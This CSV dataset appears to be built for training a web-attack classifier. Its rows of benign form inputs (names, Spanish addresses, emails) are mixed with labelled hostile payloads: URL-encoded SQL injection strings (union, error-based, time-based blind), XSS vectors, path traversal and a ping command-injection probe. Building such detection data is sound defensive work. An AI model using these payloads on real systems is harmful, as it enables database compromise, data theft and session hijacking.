payload,payload_len,alpha,non_alpha,attack_feature,label
copleston-guerrasio%40risiberia.ng,32,100.0,0.0,0.0,0
%3Ctextarea%20id%3Dxss%20onfocus%3Djavascript%3Aeval%28string%5B%27fromcharcode%27%5D%2897%2C108%2C101%2C114%2C116%2C40%2C39%2C120%2C115%2C115%2C39%2C41%2C32%29%29%20autofocus%3E,122,79.50819672131148,18.852459016393443,30000.0,1
-3868%27%29%29%20or%20make_set%286809%3D1236%2C1236%29%20and%20%28%28%27evnj%27%3D%27evnj,55,72.72727272727273,27.27272727272727,60000.0,1
san%20vicente%20de%20alcntara,23,100.0,0.0,0.0,0
calle%20fausto%20fraile%200,21,100.0,0.0,0.0,0
6110,5,80.0,20.0,25.0,0
-9758%27%2B%28select%20%27rlcy%27%20where%203691%3D3691%20union%20all%20select%203691%2C3691%2C3691%2C3691%2C3691%2C3691%2C3691--,91,83.51648351648352,16.483516483516482,90000.0,1
-7611%29%20as%20tuje%20where%206101%3D6101%20union%20all%20select%206101%2C6101%2C6101%2C6101%2C6101%2C6101%2C6101%2C6101--,89,86.51685393258427,13.48314606741573,90000.0,1
asturias,8,100.0,0.0,0.0,0
1%25%27%29%29%29%20and%206969%3D%28select%206969%20from%20pg_sleep%285%29%29%20and%20%28%28%28%27%25%27%3D%27,59,67.79661016949152,32.20338983050847,90000.0,1
55950989q,9,100.0,0.0,0.0,0
boniquet%20jeria,14,100.0,0.0,0.0,0
eluney,6,100.0,0.0,0.0,0
-1641%27%20union%20all%20select%204835%23,29,89.65517241379311,10.344827586206897,60000.0,1
vir7eino,8,100.0,0.0,0.0,0
calle%20madagascar%20130,20,100.0,0.0,0.0,0
1%27%29%20order%20by%201%23,15,80.0,20.0,30000.0,1
mango_rizzo1%40premiostv.ky,25,100.0,0.0,0.0,0
erfani,6,100.0,0.0,0.0,0
-9820%22%20or%201038%3D7502%23,20,80.0,20.0,30000.0,1
generato,8,100.0,0.0,0.0,0
granfiel,8,100.0,0.0,0.0,0
santa%20cristina%20de%20valmadrigal,29,100.0,0.0,0.0,0
84,2,100.0,0.0,0.0,0
alentorn%20etayo,14,100.0,0.0,0.0,0
7704,4,100.0,0.0,0.0,0
40574017q,9,100.0,0.0,0.0,0
1%27%29%20as%20hats%20where%202011%3D2011%20union%20all%20select%20null%2Cnull%2Cnull%2Cnull%2Cnull%23,70,88.57142857142857,11.428571428571429,90000.0,1
chaddie,7,100.0,0.0,0.0,0
34170,5,100.0,0.0,0.0,0
%3D%27%3E%3Cscript%3Ealert%28%22xss%22%29%3C/script%3E,32,68.75,31.25,45.45454545454545,1
5761,4,100.0,0.0,0.0,0
peaflor%20de%20hornija,18,100.0,0.0,0.0,0
1%27%29%29%29%20or%209643%3D%28select%20count%28%2A%29%20from%20domain.domains%20as%20t1%2Cdomain.columns%20as%20t2%2Cdomain.tables%20as%20t3%29%20and%20%28%28%28%27odkr%27%3D%27odkr,118,81.35593220338984,18.64406779661017,90000.0,1
cazoln,6,100.0,0.0,0.0,0
44491,5,100.0,0.0,0.0,0
those,5,100.0,0.0,0.0,0
dennett,7,100.0,0.0,0.0,0
2.53384E+15,16,68.75,31.25,45.45454545454545,0
edi,3,100.0,0.0,0.0,0
don%20quijote%2081%2C,15,100.0,0.0,0.0,0
1%27%20or%206793%3D%28select%206793%20from%20pg_sleep%285%29%29%20and%20%27dogx%27%3D%27dogx,58,81.03448275862068,18.96551724137931,90000.0,1
desacertadamente,16,100.0,0.0,0.0,0
1%22%29%29%29%20and%20char%28109%29%7C%7Cchar%2879%29%7C%7Cchar%2870%29%7C%7Cchar%2890%29%3Dregexp_substring%28repeat%28right%28char%285012%29%2C0%29%2C5000000000%29%2Cnull%29--,113,70.79646017699115,29.20353982300885,30000.0,1
agen,4,100.0,0.0,0.0,0
54,2,100.0,0.0,0.0,0
ervino,6,100.0,0.0,0.0,0
46909856e,9,100.0,0.0,0.0,0
.pateo,6,100.0,0.0,0.0,0
7542,4,100.0,0.0,0.0,0
8.76216E+15,16,68.75,31.25,45.45454545454545,0
hurtado9,8,100.0,0.0,0.0,0
1%29%20where%205234%3D5234%20or%208514%3Dbenchmark%285000000%2Cmd5%280x544d5a4c%29%29%23,62,85.48387096774194,14.516129032258066,60000.0,1
1%22%20where%204808%3D4808%20union%20all%20select%20null%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%23,71,87.32394366197182,12.676056338028168,90000.0,1
1%27%29%20or%20extractvalue%281297%2Cconcat%280x5c%2C0x7171706a71%2C%28select%20%28elt%281297%3D1297%2C1%29%29%29%2C0x717a767a71%29%29%20and%20%28%27tetk%27%3D%27tetk,110,79.0909090909091,20.909090909090907,60000.0,1
1%2Cexp%28~%28select%20%2A%20from%20%28select%20concat%280x7171706a71%2C%28select%20%28elt%287759%3D7759%2C1%29%29%29%2C0x717a767a71%2C0x78%29%29x%29%29,100,78.0,21.0,30000.0,1
1%22%29%20and%202853%3Dcast%28%28chr%28113%29%7C%7Cchr%28113%29%7C%7Cchr%28112%29%7C%7Cchr%28106%29%7C%7Cchr%28113%29%29%7C%7C%28select%20%28case%20when%20%282853%3D2853%29%20then%201%20else%200%20end%29%29%3A%3Atext%7C%7C%28chr%28113%29%7C%7Cchr%28122%29%7C%7Cchr%28118%29%7C%7Cchr%28122%29%7C%7Cchr%28113%29%29%20as%20numeric%29%20and%20%28%22zyeo%22%20like%20%22zyeo,213,70.89201877934272,29.107981220657276,90000.0,1
1%25%22%29%20or%204240%3D%28select%204240%20from%20pg_sleep%285%29%29--,45,75.55555555555556,24.444444444444443,60000.0,1
1%29%20or%20%28select%202%2A%28if%28%28select%20%2A%20from%20%28select%20concat%280x7171706a71%2C%28select%20%28elt%288113%3D8113%2C1%29%29%29%2C0x717a767a71%2C0x78%29%29s%29%2C%208446744073709551610%2C%208446744073709551610%29%29%29%20and%20%282303%3D2303,172,82.55813953488372,17.441860465116278,90000.0,1
1%27%20and%20extractvalue%287982%2Cconcat%280x5c%2C0x7171706a71%2C%28select%20%28elt%287982%3D7982%2C1%29%29%29%2C0x717a767a71%29%29%20and%20%27lgat%27%20like%20%27lgat,114,82.45614035087719,17.543859649122805,90000.0,1
-6987%27%20union%20all%20select%204721%2C4721--,35,85.71428571428571,14.285714285714285,60000.0,1
prueckner%40helicopter.com.gf,27,100.0,0.0,0.0,0
1,1,100.0,0.0,0.0,0
raush.runyon%40discoteatre.fk,27,100.0,0.0,0.0,0
%3Cimg%20id%3Dxss%20src%3D%22javascript%3Aalert%28%27xss%27%29%22,41,75.60975609756098,24.390243902439025,30000.0,1
alcatraz%2C%2043%2C%202-g,17,100.0,0.0,0.0,0
3303,4,100.0,0.0,0.0,0
1%22%29%20as%20xioc%20where%207260%3D7260%20or%20elt%285873%3D5873%2Csleep%285%29%29%23,55,81.81818181818183,18.181818181818183,60000.0,1
canales,7,100.0,0.0,0.0,0
-8599%29%29%20or%20elt%285628%3D2324%2C2324%29%20and%20%28%281134%3D1134,46,78.26086956521739,21.73913043478261,60000.0,1
calle%20juana%20ibarborou%20134%2C,26,100.0,0.0,0.0,0
05781002k,9,100.0,0.0,0.0,0
innova5miento,13,100.0,0.0,0.0,0
lora%20del%20ro,11,100.0,0.0,0.0,0
select%20%27qqpjq%27%7C%7C%28case%205118%20when%205118%20then%201%20else%200%20end%29%7C%7C%27qzvzq%27%20from%20rdb%24database,82,86.58536585365853,13.414634146341465,30000.0,1
1%25%22%29%29%3Bselect%20sleep%285%29%23,22,63.63636363636363,36.36363636363637,57.14285714285715,1
1%27%29%29%20and%20updatexml%283393%2Cconcat%280x2e%2C0x7171706a71%2C%28select%20%28elt%283393%3D3393%2C1%29%29%29%2C0x717a767a71%29%2C1161%29%20and%20%28%28%27vedm%27%3D%27vedm,115,77.39130434782608,22.608695652173914,60000.0,1
-4772%29%29%29%20union%20all%20select%203879%2C3879%2C3879%2C3879%2C3879--,52,80.76923076923077,19.230769230769234,60000.0,1
jamal,5,100.0,0.0,0.0,0
37115,5,100.0,0.0,0.0,0
c/%20amador%20de%20los%20rios%2C%20131%2C%201%3Fg,31,100.0,0.0,0.0,0
-2630%27%29%29%20as%20xavw%20where%206291%3D6291%20union%20all%20select%206291%2C6291%2C6291%2C6291%2C6291%2C6291%2C6291%2C6291%2C6291%23,95,85.26315789473684,14.736842105263156,90000.0,1
74799380e,9,100.0,0.0,0.0,0
1%27%29%29%3Bcall%20regexp_substring%28repeat%28right%28char%282385%29%2C0%29%2C500000000%29%2Cnull%29--,72,83.33333333333334,16.666666666666657,19.999999999999986,1
1%25%22%29%29%20and%206240%3D%28%27qqpjq%27%7C%7C%28select%20case%206240%20when%206240%20then%201%20else%200%20end%20from%20rdb%24database%29%7C%7C%27qzvzq%27%29%20and%20%28%28%22%25%22%3D%22,111,77.47747747747748,22.52252252252252,90000.0,1
1%25%27%29%29%20rlike%20%28select%20%28case%20when%20%287689%3D7689%29%20then%201%20else%200x28%20end%29%29%20and%20%28%28%27%25%27%3D%27,77,76.62337662337663,23.376623376623375,30000.0,1
escultor%20bauls%2C%2096%2C,19,100.0,0.0,0.0,0
valcour%40piensoparaperros.dj,27,100.0,0.0,0.0,0
7%2434mon3a5,10,90.0,10.0,11.11111111111111,0
1%27%29%29%29%20procedure%20analyse%28extractvalue%285840%2Cconcat%280x5c%2C0x7171706a71%2C%28select%20%28case%20when%20%285840%3D5840%29%20then%201%20else%200%20end%29%29%2C0x717a767a71%29%29%2C1%29%20and%20%28%28%28%27gfll%27%3D%27gfll,155,81.29032258064515,18.70967741935484,30000.0,1
1%29%20where%203979%3D3979%20rlike%20sleep%285%29--,35,82.85714285714286,17.142857142857142,30000.0,1
elementada,10,100.0,0.0,0.0,0
calle%20karmelo%2068%2C,17,100.0,0.0,0.0,0
1%25%22%29%29%29%20and%204386%3Dutl_inaddr.get_host_address%28chr%28113%29%7C%7Cchr%28113%29%7C%7Cchr%28112%29%7C%7Cchr%28106%29%7C%7Cchr%28113%29%7C%7C%28select%20%28case%20when%20%284386%3D4386%29%20then%201%20else%200%20end%29%20from%20dual%29%7C%7Cchr%28113%29%7C%7Cchr%28122%29%7C%7Cchr%28118%29%7C%7Cchr%28122%29%7C%7Cchr%28113%29%29%20and%20%28%28%28%22%25%22%3D%22,218,69.26605504587155,30.73394495412844,90000.0,1
valverde%20de%20valdelacasa,23,100.0,0.0,0.0,0
1%27%7C%7C%28select%20%27ybfo%27%20from%20dual%20where%203319%3D3319%20union%20all%20select%20null%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%23,102,85.29411764705883,14.705882352941178,120000.0,1
78595518x,9,100.0,0.0,0.0,0
1%27%29%3Bselect%20count%28%2A%29%20from%20all_users%20t1%2Call_users%20t2%2Call_users%20t3%2Call_users%20t4%2Call_users%20t5--,91,81.31868131868131,18.681318681318682,30000.0,1
1%22%20where%209342%3D9342%20and%206240%3D%28%27qqpjq%27%7C%7C%28select%20case%206240%20when%206240%20then%201%20else%200%20end%20from%20rdb%24database%29%7C%7C%27qzvzq%27%29--,114,84.21052631578947,15.789473684210526,90000.0,1
gu9s8na,7,100.0,0.0,0.0,0
/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././../%7Bfile%7D,310,99.35483870967742,0.6451612903225765,0.6493506493506451,1
1%27%29%20where%203262%3D3262%20union%20all%20select%20null%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%23,87,85.0574712643678,14.942528735632186,90000.0,1
ba1uetazo,9,100.0,0.0,0.0,0
7.57823E+15,16,68.75,31.25,45.45454545454545,0
ianace,6,100.0,0.0,0.0,0
/../%7Bfile%7D,10,80.0,20.0,25.0,1
6.98622E+15,16,68.75,31.25,45.45454545454545,0
moharra%20jodra,13,100.0,0.0,0.0,0
1%25%22%29%3Bselect%20%28case%20when%20%283168%3D5577%29%20then%203168%20else%203168%2A%28select%203168%20from%20mysql.db%29%20end%29%23,88,84.0909090909091,15.909090909090908,30000.0,1
73spojador,10,100.0,0.0,0.0,0
-5218%29%20union%20all%20select%209677%2C9677%23,34,88.23529411764706,11.76470588235294,60000.0,1
6.51129E+15,16,68.75,31.25,45.45454545454545,0
-8181%27%29%29%20or%205926%3D3332%23,22,72.72727272727273,27.27272727272727,30000.0,1
1%2C%28select%20%28case%20when%20%285217%3D5217%29%20then%201%20else%205217%2A%28select%205217%20from%20mysql.db%29%20end%29%29,83,85.54216867469879,14.457831325301203,30000.0,1
-4340%29%29%20or%20make_set%289354%3D9354%2C7185%29%20and%20%28%288505%3D8505,51,78.43137254901961,21.568627450980394,60000.0,1
pacn,4,100.0,0.0,0.0,0
1%22%29%29%20as%20zemm%20where%203324%3D3324%20or%202367%3D%28select%20count%28%2A%29%20from%20rdb%24fields%20as%20t1%2Crdb%24types%20as%20t2%2Crdb%24collations%20as%20t3%2Crdb%24functions%20as%20t4%29--,135,85.92592592592592,14.074074074074074,90000.0,1
t324a3ra5a,10,100.0,0.0,0.0,0
menelao,7,100.0,0.0,0.0,0
0n3r3oscura,11,100.0,0.0,0.0,0
33418,5,100.0,0.0,0.0,0
lakhian,7,100.0,0.0,0.0,0
1%22%29%29%29%3Bbegin%20dbms_lock.sleep%285%29%3B%20end%20and%20%28%28%28%22zpii%22%20like%20%22zpii,60,73.33333333333333,26.666666666666668,60000.0,1
1%25%27%29%29%3B%28select%20%2A%20from%20%28select%28sleep%285%29%29%29srmq%29%20and%20%28%28%27%25%27%3D%27,56,62.5,37.5,60000.0,1
5425,4,100.0,0.0,0.0,0
boothroy,8,100.0,0.0,0.0,0
1%25%22%29%3Bselect%20pg_sleep%285%29--,25,76.0,24.0,31.57894736842105,1
suen,4,100.0,0.0,0.0,0
lzaro,5,100.0,0.0,0.0,0
1%29%29%20or%20char%2875%29%7C%7Cchar%2870%29%7C%7Cchar%2899%29%7C%7Cchar%2883%29%3Dregexp_substring%28repeat%28left%28crypt_key%28char%2865%29%7C%7Cchar%2869%29%7C%7Cchar%2883%29%2Cnull%29%2C0%29%2C500000000%29%2Cnull%29--,141,69.50354609929079,30.49645390070922,30000.0,1
v70t4oso,8,100.0,0.0,0.0,0
postema,7,100.0,0.0,0.0,0
lecuona%20gasull,14,100.0,0.0,0.0,0
-2129%27%29%20or%202724%20in%20%28%28char%28113%29%2Bchar%28113%29%2Bchar%28112%29%2Bchar%28106%29%2Bchar%28113%29%2B%28select%20%28case%20when%20%282724%3D2724%29%20then%20char%2849%29%20else%20char%2848%29%20end%29%29%2Bchar%28113%29%2Bchar%28122%29%2Bc,210,56.666666666666664,18.095238095238095,30000.0,1
f09%24m3natriz,12,91.66666666666666,8.333333333333343,9.090909090909102,0
inusitado,9,100.0,0.0,0.0,0
rojo%20sarri,10,100.0,0.0,0.0,0
1%27%29%29%29%20and%20%283020%3D3020%29%2A6703%20and%20%28%28%28%27ujds%27%3D%27ujds,46,67.3913043478261,32.608695652173914,60000.0,1
herner,6,100.0,0.0,0.0,0
1%3Biif%285257%3D5257%2C1%2C1/0%29,22,86.36363636363636,13.63636363636364,15.789473684210531,1
antonelli-ankrum%40escarba.pm,27,100.0,0.0,0.0,0
ellston%20balladares,18,100.0,0.0,0.0,0
1%25%22%29%29%20and%207358%3D6986--,21,66.66666666666666,33.33333333333333,30000.0,1
vilajosa%20larrumbe,17,100.0,0.0,0.0,0
1%25%27%29%29%3Bbegin%20dbms_lock.sleep%285%29%3B%20end%20and%20%28%28%27%25%27%3D%27,47,63.829787234042556,36.17021276595745,30000.0,1
1%25%27%29%29%29%20and%208594%3D%28select%208594%20from%20pg_sleep%285%29%29--,48,72.91666666666666,27.083333333333332,60000.0,1
g3a254,6,100.0,0.0,0.0,0
rebes%20huasequi,14,100.0,0.0,0.0,0
jarvis-wassmann%40classroommanager.pe,35,100.0,0.0,0.0,0
croiseti,8,100.0,0.0,0.0,0
c/%20del%20ferrocarril%2C%20152%2C,24,100.0,0.0,0.0,0
asuncion%20castell%2C%2017,20,100.0,0.0,0.0,0
menju,5,100.0,0.0,0.0,0
villalobar%20de%20rioja,19,100.0,0.0,0.0,0
salmern%20grenett,15,100.0,0.0,0.0,0
1%27%2B%28select%20%27hoqt%27%20where%204877%3D4877%20or%204915%3D%28select%20count%28%2A%29%20from%20domain.domains%20as%20t1%2Cdomain.columns%20as%20t2%2Cdomain.tables%20as%20t3%29--,128,85.15625,14.84375,90000.0,1
-1854%27%29%20as%20fmmq%20where%207326%3D7326%20or%203440%3Dcast%28%28chr%28113%29%7C%7Cchr%28113%29%7C%7Cchr%28112%29%7C%7Cchr%28106%29%7C%7Cchr%28113%29%29%7C%7C%28select%20%28case%20when%20%283440%3D3440%29%20then%201%20else%200%20end%29%29%3A%3Atext%7,219,53.42465753424658,17.35159817351598,60000.0,1
p-rsigo,7,100.0,0.0,0.0,0
8clo736,7,100.0,0.0,0.0,0
1%25%27%29%29%29%3Bbegin%20dbms_lock.sleep%285%29%3B%20end--,38,76.31578947368422,23.68421052631578,31.034482758620673,1
laneuville%40hangarcentrodelautomovil.sh,38,100.0,0.0,0.0,0
64462042b,9,100.0,0.0,0.0,0
786,3,100.0,0.0,0.0,0
%3Ciframe%20src%3Dhttp%3A//www.vulnerability-lab.com%3E,45,93.33333333333333,6.666666666666671,7.142857142857148,1
collazo%20fonts,13,100.0,0.0,0.0,0
descrieres%40enibiza.com.ac,25,100.0,0.0,0.0,0
llort%20pato,10,100.0,0.0,0.0,0
1%25%27%29%20and%208312%3Ddbms_pipe.receive_message%28chr%2869%29%7C%7Cchr%2879%29%7C%7Cchr%28101%29%7C%7Cchr%2868%29%2C5%29--,80,67.5,32.5,30000.0,1
1%27%3Biif%288214%3D4954%2C1%2C1/0%29,23,82.6086956521739,17.391304347826093,21.052631578947377,1
mara%20candela,12,100.0,0.0,0.0,0
manuel%20monterrey%20calvo%2C%20186%2C,28,100.0,0.0,0.0,0
1%27%20where%209961%3D9961%20and%208514%3D%28select%20count%28%2A%29%20from%20domain.domains%20as%20t1%2Cdomain.columns%20as%20t2%2Cdomain.tables%20as%20t3%29--,114,86.8421052631579,13.157894736842104,90000.0,1
pente%40maxitienda.ms,19,100.0,0.0,0.0,0
46344401e,9,100.0,0.0,0.0,0
1%25%27%20procedure%20analyse%28extractvalue%285840%2Cconcat%280x5c%2C0x7171706a71%2C%28select%20%28case%20when%20%285840%3D5840%29%20then%201%20else%200%20end%29%29%2C0x717a767a71%29%29%2C1%29%20and%20%27%25%27%3D%27,143,82.51748251748252,17.482517482517483,30000.0,1
21613516w,9,100.0,0.0,0.0,0
1%20where%205332%3D5332%20or%20%28select%209173%20from%28select%20count%28%2A%29%2Cconcat%280x7171706a71%2C%28select%20%28elt%289173%3D9173%2C1%29%29%29%2C0x717a767a71%2Cfloor%28rand%280%29%2A2%29%29x%20from%20information_schema.character_sets%20group%20by%20x%29a%29--,189,83.06878306878306,16.93121693121693,90000.0,1
c/%20altamira%20179%2C,16,100.0,0.0,0.0,0
estupian%20lladonet,17,100.0,0.0,0.0,0
1.83452E+15,16,68.75,31.25,45.45454545454545,0
1%25%27%29%29%20and%20elt%281210%3D1210%2Csleep%285%29%29%20and%20%28%28%27%25%27%3D%27,45,62.22222222222222,37.77777777777778,60000.0,1
thomasin,8,100.0,0.0,0.0,0
1%22%20rlike%20%28select%20%28case%20when%20%285552%3D1712%29%20then%201%20else%200x28%20end%29%29,62,88.70967741935483,11.290322580645167,12.727272727272734,1
1%27%2B%28select%20sfmz%20where%204870%3D4870%20or%20char%2875%29%7C%7Cchar%2870%29%7C%7Cchar%2899%29%7C%7Cchar%2883%29%3Dregexp_substring%28repeat%28left%28crypt_key%28char%2865%29%7C%7Cchar%2869%29%7C%7Cchar%2883%29%2Cnull%29%2C0%29%2C500000000%29%2Cnull%29--,169,73.37278106508876,26.627218934911244,60000.0,1
pasaje%20cesar%20arbasia%2C%2099%2C%203-a,29,100.0,0.0,0.0,0
1%22%20or%204411%3D%28select%20count%28%2A%29%20from%20sysusers%20as%20sys1%2Csysusers%20as%20sys2%2Csysusers%20as%20sys3%2Csysusers%20as%20sys4%2Csysusers%20as%20sys5%2Csysusers%20as%20sys6%2Csysusers%20as%20sys7%29,152,91.44736842105263,8.552631578947368,60000.0,1
claverol%20lemunao,16,100.0,0.0,0.0,0
-1%3Cdiv%20style%3D%22binding%3A%20url%28%5Blink%20to%20code%5D%29%3B%22%3E,45,77.77777777777779,22.222222222222214,28.57142857142856,1
9.4488E+15,16,62.5,37.5,60.0,0
pilocarpina,11,100.0,0.0,0.0,0
1%27%29%29%29%20or%20%28select%20%2A%20from%20%28select%28sleep%285%29%29%29ydpu%29%20and%20%28%28%28%27ljhc%27%3D%27ljhc,67,70.1492537313433,29.850746268656714,90000.0,1
1%22%29%20as%20cxwd%20where%205800%3D5800%20or%206979%3Dlike%28%27abcdefg%27%2Cupper%28hex%28randomblob%28500000000/2%29%29%29%29--,89,79.7752808988764,20.224719101123593,69000.0,1
1%25%22%20or%208421%3D%28select%20count%28%2A%29%20from%20generate_series%281%2C5000000%29%29%20and%20%22%25%22%3D%22,71,76.05633802816901,23.943661971830984,90000.0,1
samanieg%20mitteenn,17,100.0,0.0,0.0,0
1%29%20where%209469%3D9469%20or%20char%28117%29%7C%7Cchar%28111%29%7C%7Cchar%28105%29%7C%7Cchar%28100%29%3Dregexp_substring%28repeat%28left%28crypt_key%28char%2865%29%7C%7Cchar%2869%29%7C%7Cchar%2883%29%2Cnull%29%2C0%29%2C500000000%29%2Cnull%29--,160,73.125,26.875,60000.0,1
3.50022E+14,16,68.75,31.25,45.45454545454545,0
-6948%22%29%29%20as%20ojjl%20where%201300%3D1300%20or%206872%3D6872--,47,82.97872340425532,17.02127659574468,60000.0,1
1%25%22%29%3Bselect%20count%28%2A%29%20from%20sysibm.systables%20as%20t1%2Csysibm.systables%20as%20t2%2Csysibm.systables%20as%20t3%20and%20%28%22%25%22%3D%22,105,82.85714285714286,17.142857142857142,60000.0,1
-1134%20union%20all%20select%201297%2C1297%2C1297%2C1297%2C1297%2C1297%2C1297%2C1297%2C1297--,69,84.05797101449275,15.942028985507244,60000.0,1
%3Cstyle%3E.crosssitescripting%7Bbackground-image%3Aurl%28%22javascript%3Aalert%28%27crosssitescripting%27%29%22%29%3B%7D%3C/style%3E%3Ca%20class%3Dcrosssitescripting%3E%3C/a%3E,131,80.1526717557252,18.3206106870229,30000.0,1
aldeanueva%20de%20santa%20cruz,24,100.0,0.0,0.0,0
2876,4,100.0,0.0,0.0,0
1%27%29%29%20and%206510%3D%28select%20count%28%2A%29%20from%20sysusers%20as%20sys1%2Csysusers%20as%20sys2%2Csysusers%20as%20sys3%2Csysusers%20as%20sys4%2Csysusers%20as%20sys5%2Csysusers%20as%20sys6%2Csysusers%20as%20sys7%29%20and%20%28%28%27vcvj%27%3D%27vcvj,174,87.93103448275862,12.068965517241379,90000.0,1
tenna1,6,100.0,0.0,0.0,0
ping%20-i%2030%20127.0.0.1,20,100.0,0.0,0.0,1
-4798%22%29%29%29%20union%20all%20select%207892%2C7892%2C7892%2C7892%2C7892%2C7892%2C7892%2C7892%2C7892%2C7892%23,77,80.51948051948052,19.480519480519483,60000.0,1
ailee1,6,100.0,0.0,0.0,0
ten.tar,7,100.0,0.0,0.0,0
79332858q,9,100.0,0.0,0.0,0
1%22%20and%208148%3Dlike%28%27abcdefg%27%2Cupper%28hex%28randomblob%28500000000/2%29%29%29%29--,65,75.38461538461539,24.615384615384617,39000.0,1
1%29%29%29%20and%20%28select%20%2A%20from%20%28select%28sleep%285%29%29%29gcrr%29%23,48,72.91666666666666,27.083333333333332,60000.0,1
1.69372E+15,16,68.75,31.25,45.45454545454545,0
61877469v,9,100.0,0.0,0.0,0
id,2,100.0,0.0,0.0,1
luciano%20nagel,13,100.0,0.0,0.0,0
46084,5,100.0,0.0,0.0,0
-2925%25%22%20or%20make_set%289354%3D9354%2C7185%29%20and%20%22%25%22%3D%22,45,71.11111111111111,28.888888888888886,60000.0,1
1%27%7C%7C%28select%20%27ezse%27%20from%20dual%20where%203821%3D3821%3Bselect%20count%28%2A%29%20from%20generate_series%281%2C5000000%29--,94,81.91489361702128,18.085106382978726,90000.0,1
c/%20dos%20de%20mayo%2089%2013%3Fb,22,100.0,0.0,0.0,0
1%22%29%29%20as%20lomw%20where%209257%3D9257%20union%20all%20select%20null%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull--,77,85.71428571428571,14.285714285714285,90000.0,1
19187311k,9,100.0,0.0,0.0,0
talia,5,100.0,0.0,0.0,0
1%27%7C%7C%28select%20%27xyft%27%20from%20dual%20where%208250%3D8250%20and%205556%3D%28select%20count%28%2A%29%20from%20all_users%20t1%2Call_users%20t2%2Call_users%20t3%2Call_users%20t4%2Call_users%20t5%29%29%7C%7C%27,145,82.06896551724138,17.93103448275862,120000.0,1
rombeek,7,100.0,0.0,0.0,0
1%27%20and%20elt%281210%3D1210%2Csleep%285%29%29%20and%20%27yhpp%27%20like%20%27yhpp,52,80.76923076923077,19.230769230769234,90000.0,1
%22%3E%3Ciframe%20src%3D%27%27%20onload%3Dalert%28%27mphone%27%29%3E,40,75.0,25.0,33.33333333333333,1
3.85057E+14,16,68.75,31.25,45.45454545454545,0
8.92715E+15,16,68.75,31.25,45.45454545454545,0
6r_o733300e,11,100.0,0.0,0.0,0
calle%20benito%20monfort%2060%2C,24,100.0,0.0,0.0,0
50108,5,100.0,0.0,0.0,0
hampton-bourne%40soyandaluz.lv,28,100.0,0.0,0.0,0
97,2,100.0,0.0,0.0,0
1%22%20and%206969%3D%28select%206969%20from%20pg_sleep%285%29%29,42,83.33333333333334,16.666666666666664,60000.0,1
4347,4,100.0,0.0,0.0,0
%3C/title%3E%3Cscript%3Edocument.cookie%3Dtrue%3B%3C/script%3E,46,76.08695652173914,23.91304347826087,60000.0,1
benaprs%20vaqu,12,100.0,0.0,0.0,0
beaulieu,8,100.0,0.0,0.0,0
-4210%22%29%20where%202679%3D2679%20or%204493%3Dutl_inaddr.get_host_address%28chr%28113%29%7C%7Cchr%28113%29%7C%7Cchr%28112%29%7C%7Cchr%28106%29%7C%7Cchr%28113%29%7C%7C%28select%20%28case%20when%20%284493%3D4493%29%20then%201%20else%200%20end%29%20from%20,223,57.847533632286996,16.143497757847534,90000.0,1
7.06862E+14,16,68.75,31.25,45.45454545454545,0
santa%20clara%20de%20avedillo,23,100.0,0.0,0.0,0
1%22%29%20and%207756%3Ddbms_utility.sqlid_to_sqlhash%28%28chr%28113%29%7C%7Cchr%28113%29%7C%7Cchr%28112%29%7C%7Cchr%28106%29%7C%7Cchr%28113%29%7C%7C%28select%20%28case%20when%20%287756%3D7756%29%20then%201%20else%200%20end%29%20from%20dual%29%7C%7Cchr%28113%29%7C%7Cchr%28122%29%7C%7Cchr%28118%29%7C%7Cchr%28122%29%7C%7Cchr%28113%29%29%29%20and%20%28%22gozk%22%3D%22gozk,224,71.875,28.125,90000.0,1
